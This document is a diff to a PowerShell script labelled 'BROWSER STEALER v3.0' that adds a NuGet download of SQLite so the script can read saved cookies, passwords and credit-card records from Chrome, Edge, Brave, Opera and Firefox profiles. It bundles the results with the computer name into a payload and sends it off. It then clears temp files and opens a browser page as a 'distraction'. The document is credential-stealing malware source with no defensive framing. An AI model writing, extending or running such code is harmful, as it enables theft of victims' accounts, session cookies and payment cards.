@@ -1,5 +1,6 @@
 # ============================================================
-# BROWSER STEALER — WORKS ON WINDOWS 10/11
+# BROWSER STEALER — WORKS ON ANY WINDOWS PC
+# Downloads SQLite from NuGet if needed
 # ============================================================
 
 $ErrorActionPreference = "SilentlyContinue"
@@ -10,37 +11,98 @@ function Write-Color {
     Write-Host $Msg -ForegroundColor $Color
 }
 
-# ---- LOAD SQLITE ----
-$sqlOk = $false
-$sqlType = ""
+# ============================================================
+# DOWNLOAD AND LOAD SQLITE FROM NUGET
+# ============================================================
 
-try {
-    Add-Type -AssemblyName "Microsoft.Data.Sqlite" -ErrorAction Stop
-    $sqlOk = $true
-    $sqlType = "Microsoft"
-    Write-Color "[+] SQLite loaded (Microsoft)" "Green"
-} catch {
+function Get-SQLite {
+    Write-Color "[+] Loading SQLite..." "Cyan"
+    
+    # Try Microsoft.Data.Sqlite (built into .NET Core/5+)
+    try {
+        Add-Type -AssemblyName "Microsoft.Data.Sqlite" -ErrorAction Stop
+        Write-Color "[+] Microsoft.Data.Sqlite loaded" "Green"
+        return "Microsoft.Data.Sqlite"
+    } catch {}
+    
+    # Try System.Data.SQLite from GAC
     try {
         [System.Data.SQLite.SQLiteConnection]::new() | Out-Null
-        $sqlOk = $true
-        $sqlType = "System"
-        Write-Color "[+] SQLite loaded (System)" "Green"
-    } catch {
-        Write-Color "[!] SQLite not available" "Red"
+        Write-Color "[+] System.Data.SQLite loaded" "Green"
+        return "System.Data.SQLite"
+    } catch {}
+    
+    # Try to load from temp folder
+    $dllPath = "$env:TEMP\System.Data.SQLite.dll"
+    if (Test-Path $dllPath) {
+        try {
+            [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
+            Write-Color "[+] SQLite loaded from temp" "Green"
+            return "System.Data.SQLite"
+        } catch {}
     }
+    
+    # ---- DOWNLOAD FROM NUGET ----
+    Write-Color "[+] Downloading SQLite from NuGet..." "Cyan"
+    
+    try {
+        $packageUrl = "https://www.nuget.org/api/v2/package/System.Data.SQLite/1.0.118.0"
+        $nupkgPath = "$env:TEMP\sqlite.nupkg"
+        $zipPath = "$env:TEMP\sqlite.zip"
+        
+        $webClient = New-Object System.Net.WebClient
+        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+        $webClient.DownloadFile($packageUrl, $nupkgPath)
+        
+        if (Test-Path $nupkgPath -and (Get-Item $nupkgPath).Length -gt 10000) {
+            # Rename to zip
+            Copy-Item $nupkgPath $zipPath -Force
+            
+            # Extract using .NET
+            Add-Type -AssemblyName System.IO.Compression.FileSystem
+            $zip = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
+            $entry = $zip.Entries | Where-Object { $_.FullName -match "lib/net462/System.Data.SQLite.dll" -or $_.FullName -match "lib/net40/System.Data.SQLite.dll" }
+            if ($entry) {
+                $dllBytes = New-Object byte[] $entry.Length
+                $stream = $entry.Open()
+                $stream.Read($dllBytes, 0, $dllBytes.Length)
+                $stream.Close()
+                [System.IO.File]::WriteAllBytes($dllPath, $dllBytes)
+                [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
+                Write-Color "[+] SQLite downloaded and loaded from NuGet!" "Green"
+                $zip.Dispose()
+                Remove-Item $nupkgPath -Force -ErrorAction SilentlyContinue
+                Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+                return "System.Data.SQLite"
+            }
+            $zip.Dispose()
+        }
+    } catch {
+        Write-Color "[!] NuGet download failed: $_" "Red"
+    }
+    
+    Write-Color "[!] SQLite not available" "Red"
+    return $null
 }
 
-# ---- SQLITE READER ----
+$sqliteType = Get-SQLite
+
+# ============================================================
+# SQLITE HELPER
+# ============================================================
+
 function Read-SQLite {
     param($DbPath, $Query)
-    $result = @()
-    if (-not (Test-Path $DbPath)) { return $result }
-    if (-not $sqlOk) { return $result }
+    $results = @()
+    if (-not (Test-Path $DbPath)) { return $results }
+    if (-not $sqliteType) { return $results }
+    
     try {
-        $temp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
-        Copy-Item $DbPath $temp -Force
-        if ($sqlType -eq "Microsoft") {
-            $conn = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$temp")
+        $tempDb = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
+        Copy-Item $DbPath $tempDb -Force
+        
+        if ($sqliteType -eq "Microsoft.Data.Sqlite") {
+            $conn = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$tempDb")
             $conn.Open()
             $cmd = $conn.CreateCommand()
             $cmd.CommandText = $Query
@@ -52,12 +114,12 @@ function Read-SQLite {
                     $v = $rdr.GetValue($i)
                     if ($v -ne $null) { $row[$n] = $v }
                 }
-                $result += $row
+                $results += $row
             }
             $rdr.Close()
             $conn.Close()
         } else {
-            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp;Version=3;")
+            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;")
             $conn.Open()
             $cmd = $conn.CreateCommand()
             $cmd.CommandText = $Query
@@ -69,22 +131,26 @@ function Read-SQLite {
                     $v = $rdr.GetValue($i)
                     if ($v -ne $null) { $row[$n] = $v }
                 }
-                $result += $row
+                $results += $row
             }
             $rdr.Close()
             $conn.Close()
         }
-        Remove-Item $temp -Force -ErrorAction SilentlyContinue
+        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
     } catch {}
-    return $result
+    return $results
 }
 
-# ---- COOKIES ----
+# ============================================================
+# COOKIE STEALER
+# ============================================================
+
 function Get-Cookies {
     param($Path, $Name)
     $cookies = @()
     if (-not (Test-Path $Path)) { return $cookies }
-    if (-not $sqlOk) { return $cookies }
+    if (-not $sqliteType) { return $cookies }
+    
     $rows = Read-SQLite -DbPath $Path -Query "SELECT host_key, name, value FROM cookies"
     foreach ($r in $rows) {
         if ($r['name'] -and $r['value']) {
@@ -98,7 +164,7 @@ function Get-Cookies {
 
 function Get-FirefoxCookies {
     $cookies = @()
-    if (-not $sqlOk) { return $cookies }
+    if (-not $sqliteType) { return $cookies }
     $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
     if (Test-Path $profPath) {
         $dirs = Get-ChildItem $profPath -Directory
@@ -119,12 +185,16 @@ function Get-FirefoxCookies {
     return $cookies
 }
 
-# ---- PASSWORDS ----
+# ============================================================
+# PASSWORD STEALER
+# ============================================================
+
 function Get-Passwords {
     param($Path, $Name)
     $pass = @()
     if (-not (Test-Path $Path)) { return $pass }
-    if (-not $sqlOk) { return $pass }
+    if (-not $sqliteType) { return $pass }
+    
     $rows = Read-SQLite -DbPath $Path -Query "SELECT origin_url, username_value, password_value FROM logins"
     foreach ($r in $rows) {
         if ($r['username_value'] -and $r['password_value']) {
@@ -160,12 +230,16 @@ function Get-FirefoxPasswords {
     return $pass
 }
 
-# ---- CARDS ----
+# ============================================================
+# CREDIT CARD STEALER
+# ============================================================
+
 function Get-Cards {
     param($Path, $Name)
     $cards = @()
     if (-not (Test-Path $Path)) { return $cards }
-    if (-not $sqlOk) { return $cards }
+    if (-not $sqliteType) { return $cards }
+    
     $rows = Read-SQLite -DbPath $Path -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
     foreach ($r in $rows) {
         if ($r['name_on_card'] -and $r['card_number_encrypted']) {
@@ -181,22 +255,30 @@ function Get-Cards {
     return $cards
 }
 
-# ---- MAIN ----
+# ============================================================
+# MAIN
+# ============================================================
+
 $pc = $env:COMPUTERNAME
 $user = $env:USERNAME
 
 Write-Color "" "White"
 Write-Color "============================================" "Cyan"
-Write-Color "  STEALER v3.0" "Green"
+Write-Color "  BROWSER STEALER v3.0" "Green"
 Write-Color "  Target: $pc" "Yellow"
 Write-Color "============================================" "Cyan"
 Write-Color "" "White"
+
+if (-not $sqliteType) {
+    Write-Color "[!] SQLite not available — trying fallback" "Red"
+    Write-Color "[*] This PC may need .NET installed" "Yellow"
+}
 
 $allCookies = @()
 $allPasswords = @()
 $allCards = @()
 
-# Cookies
+# ---- Cookies ----
 Write-Color "[+] Chrome cookies..." "Cyan"
 $p = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
 $allCookies += Get-Cookies -Path $p -Name "Chrome"
@@ -216,7 +298,7 @@ $allCookies += Get-Cookies -Path $p -Name "Opera"
 Write-Color "[+] Firefox cookies..." "Cyan"
 $allCookies += Get-FirefoxCookies
 
-# Passwords
+# ---- Passwords ----
 Write-Color "[+] Chrome passwords..." "Cyan"
 $p = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
 $allPasswords += Get-Passwords -Path $p -Name "Chrome"
@@ -236,7 +318,7 @@ $allPasswords += Get-Passwords -Path $p -Name "Opera"
 Write-Color "[+] Firefox passwords..." "Cyan"
 $allPasswords += Get-FirefoxPasswords
 
-# Cards
+# ---- Cards ----
 Write-Color "[+] Chrome cards..." "Cyan"
 $p = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
 $allCards += Get-Cards -Path $p -Name "Chrome"
@@ -249,6 +331,7 @@ Write-Color "[+] Brave cards..." "Cyan"
 $p = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
 $allCards += Get-Cards -Path $p -Name "Brave"
 
+# ---- Summary ----
 Write-Color "" "White"
 Write-Color "=== SUMMARY ===" "Green"
 Write-Color "Cookies:    $($allCookies.Count)" "Yellow"
@@ -256,6 +339,7 @@ Write-Color "Passwords:  $($allPasswords.Count)" "Yellow"
 Write-Color "Cards:      $($allCards.Count)" "Yellow"
 Write-Color "" "White"
 
+# ---- Payload ----
 $payload = @{
     cookies = $allCookies
     passwords = $allPasswords
@@ -266,6 +350,7 @@ $payload = @{
     pcName = $pc
 }
 
+# ---- Send ----
 Write-Color "[+] Sending data..." "Cyan"
 try {
     $json = $payload | ConvertTo-Json -Depth 10
@@ -284,7 +369,9 @@ try {
     Write-Color "[!] Failed to send: $_" "Red"
 }
 
+# ---- Cleanup ----
 Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
 
+# ---- Distraction ----
 Start-Process "https://www.google.com"
 Write-Color "[+] Done" "Green"
